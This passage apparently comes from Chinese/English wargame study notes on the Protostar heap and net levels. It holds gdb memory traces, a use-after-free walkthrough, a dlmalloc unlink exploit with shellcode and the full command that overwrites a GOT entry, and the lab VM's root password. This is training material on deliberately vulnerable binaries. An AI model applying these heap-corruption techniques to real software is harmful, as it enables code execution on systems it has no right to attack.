0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fde000 0xb7fe2000 0x4000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] ( gdb ) break *0x0804895f # call 0x804881c <printf@plt> Breakpoint 1 at 0x804895f: file heap2/heap2.c, line 20 . ( gdb ) command # define what gdb commands shall be executed when the breakpoint is hit Type commands for when breakpoint 1 is hit, one per line. End with a line saying just \"end\" . >echo ------------------------------------------------- \\n >x/20wx 0x804c000 # print the heap >echo --------auth------------------------------------- \\n >print *auth >echo --------service---------------------------------- \\n >print service >echo ------------------------------------------------- \\n >continue >end 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 ( gdb ) r Starting program: /opt/protostar/bin/heap2 Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c Current language: auto The current source language is \"auto; currently c\" . ------------------------------------------------- 0x804c000: Cannot access memory at address 0x804c000 ( gdb ) c Continuing. [ auth = ( nil ) , service = ( nil ) ] auth admin Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x696d6461 0x00000a6e # \u5b9e\u9645\u4e0a sizeof(auth) \u8fd4\u56de\u7684\u662f\u6307\u9488 auth \u7684\u5927\u5c0f\uff084 bytes\uff09\u800c\u4e0d\u662f\u7ed3\u6784\u4f53 auth # \u8003\u8651\u5230\u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ea\u5206\u914d\u4e86 8 \u5b57\u8282\uff088 bytes header + 8 bytes data\uff09 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $5 = { name = \"admin\\n\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $6 = 0x0 ------------------------------------------------- [ auth = 0x804c008, service = ( nil ) ] reset Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- # the first word of the chunk data got replaced with 0 # because the first word in a free chunk is defined as the previous free chunk address # free chunks \u662f\u94fe\u8868\uff0c\u56e0\u4e3a\u6ca1\u6709\u5176\u5b83 free chunk\uff0c\u6240\u4ee5\u4e3a\u7a7a 0x804c000: 0x00000000 0x00000011 0x00000000 0x00000a6e 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $7 = { name = \"\\000\\000\\000\\000n\\n\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $8 = 0x0 ------------------------------------------------- [ auth = 0x804c008, service = ( nil ) ] service AAA Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x41414120 0x0000000a 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $9 = { name = \" AAA\\n\\000\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $10 = 0x804c008 \" AAA\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c008 ] service BBB Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x41414120 0x0000000a 0x804c010: 0x00000000 0x00000011 0x42424220 0x0000000a 0x804c020: 0x00000000 0x00000fe1 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $11 = { name = \" AAA\\n\\000\\000\\000\\000\\000\\000\\000\\021\\000\\000\\000 BBB\\n\\000\\000\\000\\000\\000\\000\\000\\341\\017\\000\" , auth = 0 } --------service---------------------------------- $12 = 0x804c018 \" BBB\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c018 ] service CCC Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x41414120 0x0000000a 0x804c010: 0x00000000 0x00000011 0x42424220 0x0000000a 0x804c020: 0x00000000 0x00000011 0x43434320 0x0000000a 0x804c030: 0x00000000 0x00000fd1 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- # struct auth { # char name[32]; # int auth; # }; # 0x804c008 + 0x20 = 0x804c028 $13 = { name = \" AAA\\n\\000\\000\\000\\000\\000\\000\\000\\021\\000\\000\\000 BBB\\n\\000\\000\\000\\000\\000\\000\\000\\021\\000\\000\" , auth = 1128481568 } # 0x43434320 --------service---------------------------------- $14 = 0x804c028 \" CCC\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c028 ] login you have logged in already! \u7531\u4e8e\u52a8\u6001\u5206\u914d\u5927\u5c0f\u9519\u8bef\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 ( gdb ) r Starting program: /opt/protostar/bin/heap2 Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c Current language: auto The current source language is \"auto; currently c\" . ------------------------------------------------- 0x804c000: Cannot access memory at address 0x804c000 ( gdb ) c Continuing. [ auth = ( nil ) , service = ( nil ) ] auth admin Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x696d6461 0x00000a6e 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $17 = { name = \"admin\\n\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $18 = 0x0 ------------------------------------------------- [ auth = 0x804c008, service = ( nil ) ] service AAAAAAAAAAAAAAAAAAAAAAAAAAA Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x696d6461 0x00000a6e 0x804c010: 0x00000000 0x00000029 0x41414120 0x41414141 0x804c020: 0x41414141 0x41414141 0x41414141 0x41414141 0x804c030: 0x41414141 0x0000000a 0x00000000 0x00000fc9 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $19 = { name = \"admin\\n\\000\\000\\000\\000\\000\\000)\\000\\000\\000 \" , 'A' <repeats 15 times>, auth = 1094795585 } --------service---------------------------------- $20 = 0x804c018 \" \" , 'A' <repeats 27 times>, \"\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c018 ] login you have logged in already!","title":"Heap 2"},{"location":"wargames/protostar/heap/#exploit_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # use after free $ ./heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] reset [ auth = 0x804c008, service = ( nil ) ] service AAA [ auth = 0x804c008, service = 0x804c008 ] service BBB [ auth = 0x804c008, service = 0x804c018 ] service CCC [ auth = 0x804c008, service = 0x804c028 ] login you have logged in already! 1 2 3 4 5 6 7 8 9 # simple overwrite $ ./heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] service AAAAAAAAAAAAAAAAAAAAAAA [ auth = 0x804c008, service = 0x804c018 ] login you have logged in already!","title":"Exploit"},{"location":"wargames/protostar/heap/#heap-3","text":"the Doug Lea Malloc (dlmalloc) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/types.h> #include <stdio.h> void winner () { printf ( \"that wasn't too bad now, was it? @ %d \\n \" , time ( NULL )); } int main ( int argc , char ** argv ) { char * a , * b , * c ; a = malloc ( 32 ); b = malloc ( 32 ); c = malloc ( 32 ); strcpy ( a , argv [ 1 ]); // can't deal with null bytes strcpy ( b , argv [ 2 ]); strcpy ( c , argv [ 3 ]); free ( c ); free ( b ); free ( a ); printf ( \"dynamite failed? \\n \" ); } \u901a\u8fc7 malloc \u7684 unlink \u4fee\u6539 GOT \u8868\u6761\u76ee\uff0c FD->bk \u5bf9\u5e94\u76ee\u6807 GOT \u8868\u6761\u76ee\u5730\u5740\uff0c BK \u6307\u5411 shellcode \u7684\u8d77\u59cb\u5730\u5740 \u6ce8\u610f\u6709 BK->fd \u5199\u56de 1 2 3 4 5 6 #define unlink(P, BK, FD) { FD = P -> fd ; BK = P -> bk ; FD -> bk = BK ; BK -> fd = FD ; } Overflow b \u4fee\u6539 c \u5bf9\u5e94 chunk \u7684\u5927\u5c0f\u4f7f\u5176\u5927\u4e8e MAX_FAST_SIZE 80 \uff0cOverflow c \u6765\u6784\u9020 fake chunk \u63a7\u5236 unlink \uff0c\u7528\u4e8e\u8c03\u7528\u51fd\u6570 winner \u7684 shellcode \u53ef\u653e\u4e8e a \u4e2d fake chunk \u7684 prev_inuse \u4f4d\u9700\u8bbe\u7f6e\u4e3a 0 \u6ce8\u610f free \u4f1a\u4fee\u6539 chunk \u7684 forward pointer\uff0c\u5373 data \u57df\u7684\u9996 \\(4\\) \u5b57\u8282 prev_size size fd bk fake chunk \u7684 next chunk \u7684 prev_inuse \u4f4d\u540c\u6837\u5e94\u4e3a 0\uff0c\u4ece\u800c\u80fd\u8c03\u7528 unlink 1 2 3 4 5 6 7 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); if ( ! nextinuse ) { unlink ( nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); next chunk \u7684\u8d77\u59cb\u5730\u5740\u6839\u636e\u5f53\u524d chunk \u7684\u8d77\u59cb\u5730\u5740\u548c size \u8fdb\u884c\u8ba1\u7b97\uff0c\u53ef\u4ee5\u8bbe\u7f6e size \u4e3a 0xfffffffc \uff0c\u5b9e\u9645\u8ba1\u7b97\u7b49\u540c\u4e8e -4\uff0c\u907f\u514d\u4e86 null \u5b57\u8282\u4e5f\u65e0\u9700\u518d\u6784\u9020\u4e00\u4e2a chunk \u67e5\u770b\u76f8\u5173\u5730\u5740\u4fe1\u606f Dump of assembler code for function main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x08048889 <main+0>: push ebp 0x0804888a <main+1>: mov ebp,esp 0x0804888c <main+3>: and esp,0xfffffff0 0x0804888f <main+6>: sub esp,0x20 0x08048892 <main+9>: mov DWORD PTR [ esp ] ,0x20 0x08048899 <main+16>: call 0x8048ff2 <malloc> 0x0804889e <main+21>: mov DWORD PTR [ esp+0x14 ] ,eax 0x080488a2 <main+25>: mov DWORD PTR [ esp ] ,0x20 0x080488a9 <main+32>: call 0x8048ff2 <malloc> 0x080488ae <main+37>: mov DWORD PTR [ esp+0x18 ] ,eax 0x080488b2 <main+41>: mov DWORD PTR [ esp ] ,0x20 0x080488b9 <main+48>: call 0x8048ff2 <malloc> 0x080488be <main+53>: mov DWORD PTR [ esp+0x1c ] ,eax 0x080488c2 <main+57>: mov eax,DWORD PTR [ ebp+0xc ] 0x080488c5 <main+60>: add eax,0x4 0x080488c8 <main+63>: mov eax,DWORD PTR [ eax ] 0x080488ca <main+65>: mov DWORD PTR [ esp+0x4 ] ,eax 0x080488ce <main+69>: mov eax,DWORD PTR [ esp+0x14 ] 0x080488d2 <main+73>: mov DWORD PTR [ esp ] ,eax 0x080488d5 <main+76>: call 0x8048750 <strcpy@plt> 0x080488da <main+81>: mov eax,DWORD PTR [ ebp+0xc ] 0x080488dd <main+84>: add eax,0x8 0x080488e0 <main+87>: mov eax,DWORD PTR [ eax ] 0x080488e2 <main+89>: mov DWORD PTR [ esp+0x4 ] ,eax 0x080488e6 <main+93>: mov eax,DWORD PTR [ esp+0x18 ] 0x080488ea <main+97>: mov DWORD PTR [ esp ] ,eax 0x080488ed <main+100>: call 0x8048750 <strcpy@plt> 0x080488f2 <main+105>: mov eax,DWORD PTR [ ebp+0xc ] 0x080488f5 <main+108>: add eax,0xc 0x080488f8 <main+111>: mov eax,DWORD PTR [ eax ] 0x080488fa <main+113>: mov DWORD PTR [ esp+0x4 ] ,eax 0x080488fe <main+117>: mov eax,DWORD PTR [ esp+0x1c ] 0x08048902 <main+121>: mov DWORD PTR [ esp ] ,eax 0x08048905 <main+124>: call 0x8048750 <strcpy@plt> 0x0804890a <main+129>: mov eax,DWORD PTR [ esp+0x1c ] 0x0804890e <main+133>: mov DWORD PTR [ esp ] ,eax 0x08048911 <main+136>: call 0x8049824 <free> 0x08048916 <main+141>: mov eax,DWORD PTR [ esp+0x18 ] 0x0804891a <main+145>: mov DWORD PTR [ esp ] ,eax 0x0804891d <main+148>: call 0x8049824 <free> 0x08048922 <main+153>: mov eax,DWORD PTR [ esp+0x14 ] 0x08048926 <main+157>: mov DWORD PTR [ esp ] ,eax 0x08048929 <main+160>: call 0x8049824 <free> 0x0804892e <main+165>: mov DWORD PTR [ esp ] ,0x804ac27 0x08048935 <main+172>: call 0x8048790 <puts@plt> 0x0804893a <main+177>: leave 0x0804893b <main+178>: ret End of assembler dump. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ( gdb ) x winner 0x8048864 <winner>: 0x83e58955 ( gdb ) disassemble 0x8048790 Dump of assembler code for function puts@plt: 0x08048790 <puts@plt+0>: jmp DWORD PTR ds:0x804b128 0x08048796 <puts@plt+6>: push 0x68 0x0804879b <puts@plt+11>: jmp 0x80486b0 End of assembler dump. ( gdb ) x 0x804b128 0x804b128 <_GLOBAL_OFFSET_TABLE_+64>: 0x08048796 ( gdb ) info proc map process 17219 cmdline = '/opt/protostar/bin/heap3' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/heap3' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804b000 0x3000 0 /opt/protostar/bin/heap3 0x804b000 0x804c000 0x1000 0x3000 /opt/protostar/bin/heap3 0x804c000 0x804d000 0x1000 0 [ heap ] 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] \u901a\u8fc7 Online x86 / x64 Assembler and Disassembler \u5c06\u8c03\u7528\u51fd\u6570 winner \u7684\u6c47\u7f16\u8f6c\u6362\u4e3a shellcode 1 2 3 4 # move the address of winner() into eax and call mov eax, 0x8048864 call eax # \\xB8\\x64\\x88\\x04\\x08\\xFF\\xD0","title":"Heap 3"},{"location":"wargames/protostar/heap/#exploit_3","text":"1 2 3 $ ./heap3 ` echo -ne \"AAAA\\xB8\\x64\\x88\\x04\\x08\\xFF\\xD0\" ` ` python -c \"print('B' * 36 + '\\x65')\" ` ` python -c \"print('C' * 92 + '\\xfc\\xff\\xff\\xff' * 2 + '\\x1c\\xb1\\x04\\x08\\x0c\\xc0\\x04\\x08')\" ` that wasn ' t too bad now, was it? @ 1662354454 Segmentation fault","title":"Exploit"},{"location":"wargames/protostar/net/","text":"The levels to be exploited can be found in the /opt/protostar/bin directory. Net 0 \u00b6 converting strings to little endian integers 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \"../common/common.c\" #define NAME \"net0\" #define UID 999 #define GID 999 #define PORT 2999 void run () { unsigned int i ; unsigned int wanted ; wanted = random (); printf ( \"Please send '%d' as a little endian 32bit int \\n \" , wanted ); if ( fread ( & i , sizeof ( i ), 1 , stdin ) == NULL ) { // fread from stdin errx ( 1 , \":( \\n \" ); } if ( i == wanted ) { printf ( \"Thank you sir/madam \\n \" ); } else { printf ( \"I'm sorry, you sent %d instead \\n \" , i ); } } int main ( int argc , char ** argv , char ** envp ) { int fd ; char * username ; /* Run the process as a daemon */ background_process ( NAME , UID , GID ); // deamonizes by cloning itself and killing the parent /* Wait for socket activity and return */ fd = serve_forever ( PORT ); // listen on port 2999 for TCP connections /* Set the client socket to STDIN, STDOUT, and STDERR */ set_io ( fd ); /* Don't do this :> */ srandom ( time ( NULL )); run (); } \u5728\u5f00\u59cb\u505a\u4e4b\u524d\uff0c\u6ce8\u610f\u5230 net0 \u5df2\u5728\u8fd0\u884c\u4e2d 1 2 3 $ ps aux | grep net0 999 1503 0 .0 0 .0 1532 272 ? Ss Sep02 0 :00 /opt/protostar/bin/net0 user 17387 0 .0 0 .0 3272 644 pts/0 S+ 01 :16 0 :00 grep net0 \u53ef\u4ee5\u5207\u6362\u5230 root \u4ee5\u4fbf\u91cd\u65b0\u542f\u52a8 net0 \uff0c\u7528\u6237\u540d\u5bc6\u7801 root:godmode \u6740\u6389\u539f\u5148\u7684 net0 \u8fdb\u7a0b\uff0c\u901a\u8fc7 strace \u542f\u52a8\uff0c\u6ce8\u610f\u5230\u6700\u540e\u8c03\u7528\u4e86\u51fd\u6570 clone() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # kill 1503 # strace ./net0 execve ( \"./net0\" , [ \"./net0\" ] , [ /* 24 vars */ ]) = 0 brk ( 0 ) = 0x804b000 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) mmap2 ( NULL, 8192 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7fe0000 access ( \"/etc/ld.so.preload\" , R_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/etc/ld.so.cache\" , O_RDONLY ) = 3 fstat64 ( 3 , { st_mode = S_IFREG | 0644 , st_size = 13796 , ... }) = 0 mmap2 ( NULL, 13796 , PROT_READ, MAP_PRIVATE, 3 , 0 ) = 0xb7fdc000 close ( 3 ) = 0 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/lib/libc.so.6\" , O_RDONLY ) = 3 read ( 3 , \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\320m\\1\\0004\\0\\0\\0\" ..., 512 ) = 512 fstat64 ( 3 , { st_mode = S_IFREG | 0755 , st_size = 1319176 , ... }) = 0 mmap2 ( NULL, 1329480 , PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_DENYWRITE, 3 , 0 ) = 0xb7e97000 mprotect ( 0xb7fd5000, 4096 , PROT_NONE ) = 0 mmap2 ( 0xb7fd6000, 12288 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_DENYWRITE, 3 , 0x13e ) = 0xb7fd6000 mmap2 ( 0xb7fd9000, 10568 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0 ) = 0xb7fd9000 close ( 3 ) = 0 mmap2 ( NULL, 4096 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7e96000 set_thread_area ({ entry_number:-1 -> 6 , base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1 }) = 0 mprotect ( 0xb7fd6000, 8192 , PROT_READ ) = 0 mprotect ( 0xb7ffe000, 4096 , PROT_READ ) = 0 munmap ( 0xb7fdc000, 13796 ) = 0 rt_sigaction ( SIGCHLD, { 0x8048dc4, [ CHLD ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 rt_sigaction ( SIGPIPE, { SIG_IGN, [ PIPE ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 open ( \"/opt/protostar/run/net0.pid\" , O_RDWR | O_CREAT | O_TRUNC, 0700 ) = 3 setgroups32 ( 1 , [ 999 ]) = 0 setresgid32 ( 999 , 999 , 999 ) = 0 setresuid32 ( 999 , 999 , 999 ) = 0 clone ( child_stack = 0 , flags = CLONE_CHILD_CLEARTID | CLONE_CHILD_SETTID | SIGCHLD, child_tidptr = 0xb7e96728 ) = 17420 # clone() \u5c06\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u662f\u81ea\u8eab\u7684\u514b\u9686 # \u8fd4\u56de\u503c 17420 \u4e3a\u65b0\u8fdb\u7a0b\u7684 PID exit_group ( 0 ) = ? # \u7236\u8fdb\u7a0b\u9000\u51fa\uff0c\u7559\u4e0b\u5b50\u8fdb\u7a0b net0 \u901a\u8fc7 -f \u6765\u8ddf\u8e2a\u5b50\u8fdb\u7a0b\uff0c\u56e0\u4e3a\u6ca1\u6709\u6740\u6389\u521a\u521b\u5efa\u7684\u8fdb\u7a0b\uff0c\u6240\u4ee5\u63d0\u793a Address already in use 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 # -f -- follow forks # strace -f ./net0 execve ( \"./net0\" , [ \"./net0\" ] , [ /* 24 vars */ ]) = 0 brk ( 0 ) = 0x804b000 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) mmap2 ( NULL, 8192 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7fe0000 access ( \"/etc/ld.so.preload\" , R_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/etc/ld.so.cache\" , O_RDONLY ) = 3 fstat64 ( 3 , { st_mode = S_IFREG | 0644 , st_size = 13796 , ... }) = 0 mmap2 ( NULL, 13796 , PROT_READ, MAP_PRIVATE, 3 , 0 ) = 0xb7fdc000 close ( 3 ) = 0 access ( \"/etc/ld.so.nohwcap\" , F_OK ) = -1 ENOENT ( No such file or directory ) open ( \"/lib/libc.so.6\" , O_RDONLY ) = 3 read ( 3 , \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\320m\\1\\0004\\0\\0\\0\" ..., 512 ) = 512 fstat64 ( 3 , { st_mode = S_IFREG | 0755 , st_size = 1319176 , ... }) = 0 mmap2 ( NULL, 1329480 , PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_DENYWRITE, 3 , 0 ) = 0xb7e97000 mprotect ( 0xb7fd5000, 4096 , PROT_NONE ) = 0 mmap2 ( 0xb7fd6000, 12288 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_DENYWRITE, 3 , 0x13e ) = 0xb7fd6000 mmap2 ( 0xb7fd9000, 10568 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0 ) = 0xb7fd9000 close ( 3 ) = 0 mmap2 ( NULL, 4096 , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 ) = 0xb7e96000 set_thread_area ({ entry_number:-1 -> 6 , base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1 }) = 0 mprotect ( 0xb7fd6000, 8192 , PROT_READ ) = 0 mprotect ( 0xb7ffe000, 4096 , PROT_READ ) = 0 munmap ( 0xb7fdc000, 13796 ) = 0 rt_sigaction ( SIGCHLD, { 0x8048dc4, [ CHLD ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 rt_sigaction ( SIGPIPE, { SIG_IGN, [ PIPE ] , SA_RESTART } , { SIG_DFL, [] , 0 } , 8 ) = 0 open ( \"/opt/protostar/run/net0.pid\" , O_RDWR | O_CREAT | O_TRUNC, 0700 ) = 3 # 3 for filedescriptor setgroups32 ( 1 , [ 999 ]) = 0 setresgid32 ( 999 , 999 , 999 ) = 0 setresuid32 ( 999 , 999 , 999 ) = 0 clone ( Process 17423 attached child_stack = 0 , flags = CLONE_CHILD_CLEARTID | CLONE_CHILD_SETTID | SIGCHLD, child_tidptr = 0xb7e96728 ) = 17423 [ pid 17422 ] exit_group ( 0 ) = ? # parent exit setsid () = 17423 # attached to the new process chdir ( \"/\" ) = 0 open ( \"/dev/null\" , O_RDWR ) = 4 fstat64 ( 4 , { st_mode = S_IFCHR | 0666 , st_rdev = makedev ( 1 , 3 ) , ... }) = 0 dup2 ( 4 , 0 ) = 0 # stdin dup2 ( 4 , 1 ) = 1 # stdout dup2 ( 4 , 2 ) = 2 # stderr # bend all standard streams to /dev/null close ( 4 ) = 0 write ( 3 , \"17423\\n\" , 6 ) = 6 # write child's process id to net0.pid close ( 3 ) = 0 socket ( PF_INET, SOCK_STREAM, IPPROTO_IP ) = 3 setsockopt ( 3 , SOL_SOCKET, SO_REUSEADDR, [ 1 ] , 4 ) = 0 bind ( 3 , { sa_family = AF_INET, sin_port = htons ( 2999 ) , sin_addr = inet_addr ( \"0.0.0.0\" )} , 16 ) = -1 EADDRINUSE ( Address already in use ) # bind this process to port 2999 write ( 2 , \"serve_forever: unable to bind():\" ..., 56 ) = 56 exit_group ( 6 ) = ? Process 17423 detached \u91cd\u65b0\u542f\u52a8 net0 \u5e76\u8ddf\u8e2a 1 2 3 4 5 6 7 8 9 # killall net0 # strace -f ./net0 execve ( \"./net0\" , [ \"./net0\" ] , [ /* 24 vars */ ]) = 0 ... socket ( PF_INET, SOCK_STREAM, IPPROTO_IP ) = 3 setsockopt ( 3 , SOL_SOCKET, SO_REUSEADDR, [ 1 ] , 4 ) = 0 bind ( 3 , { sa_family = AF_INET, sin_port = htons ( 2999 ) , sin_addr = inet_addr ( \"0.0.0.0\" )} , 16 ) = 0 listen ( 3 , 10 ) = 0 # listen on the port accept ( 3 , # waiting for a packet to arrive \u53e6\u8d77\u4e00\u4e2a\u7ec8\u7aef\uff0c\u901a\u8fc7 netstat \u67e5\u627e\u76d1\u542c\u8fdb\u7a0b 1 2 3 4 5 6 7 8 9 10 11 12 13 # netstat -plant # -p, --programs - display PID/Program name for sockets # -l, --listening - display listening server sockets # -a, --all, --listening - display all sockets (default: connected) # -n, --numeric - don't resolve names # <Socket>={-t|--tcp} Active Internet connections ( servers and established ) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name ... tcp 0 0 0 .0.0.0:2998 0 .0.0.0:* LISTEN 1507 /net1 tcp 0 0 0 .0.0.0:2999 0 .0.0.0:* LISTEN 17964 /net0 tcp 0 0 127 .0.0.1:25 0 .0.0.0:* LISTEN 1479 /exim4 ... nc 